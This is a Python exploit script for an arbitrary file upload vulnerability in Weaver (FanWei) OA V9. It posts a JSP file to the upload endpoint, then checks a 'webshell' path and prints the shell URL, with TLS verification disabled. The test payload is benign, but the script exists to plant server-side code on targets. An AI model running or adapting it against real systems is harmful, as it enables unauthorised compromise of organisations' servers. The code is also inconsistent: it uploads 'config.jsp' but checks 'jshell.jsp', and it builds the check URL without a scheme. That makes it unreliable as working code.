import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging
import urllib3
from urllib.parse import urljoin

requests.packages.urllib3.disable_warnings()


def FanWei_upload(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'  
    target = urljoin(urldata, "page/exportImport/uploadOperation.jsp")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68",
        "Accept-Encoding": "gzip, deflate"
    }
    shell_content = '<% out.println("Hello The World");%>'
    try:
        files = [('file', ('config.jsp', shell_content, 'application/octet-stream'))]
        response = requests.post(target, files=files, headers=headers, timeout=30, verify=False)
        if response.status_code == 200 and "25" == response.headers.get("Content-Length"):
            webshell = urljoin(url, "./jshell.jsp") ## 木马
            response = requests.get(webshell, headers=headers, timeout=30, verify=False)
            if response.status_code == 200:
                print("[+] 文件上传成功！")
                print("[+] webshell: " + webshell)
                print(Vcolors.RED +"[!] 存在泛微OA V9 任意文件上传漏洞\r" + Vcolors.ENDC)
            if response.status_code == 403:
                print("[-] 文件上传成功，但访问被拦截！")
        else:
            print(Vcolors.RED +"[!] 不存在文件上传\r" + Vcolors.ENDC)
            
    except :    
        logging.error("FanWei_upload脚本出现异常")
  
        


